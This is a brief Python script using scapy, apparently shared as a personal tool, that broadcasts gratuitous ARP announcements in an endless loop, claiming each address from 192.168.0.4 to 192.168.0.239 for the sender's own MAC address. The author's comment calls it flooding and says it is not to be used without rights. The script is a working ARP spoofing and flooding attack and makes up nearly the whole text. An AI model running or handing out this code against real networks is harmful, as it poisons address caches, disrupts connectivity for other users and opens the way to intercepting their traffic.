# CopyRight @hejhdiss(Muhammed Shafin P)
# Licensed under Apache 2.0.
# this will show as announcment vment in tshark

from scapy.all import Ether,ARP,sendp,get_if_hwaddr
import time
iface='wlo1'
while True:
	for i in range (4,240):
		ip_as=f"192.168.0.{i}"
		print(f"{ip_as}:sending as this")
		pkt=Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1,hwsrc=get_if_hwaddr(iface),psrc=ip_as ,hwdst="ff:ff:ff:ff:ff:ff",pdst=ip_as)
		sendp(pkt,iface=iface,verbose=True)
# add or use time.sleep(x) ,x = time you want .this is a flooding.so dont use it without rights.
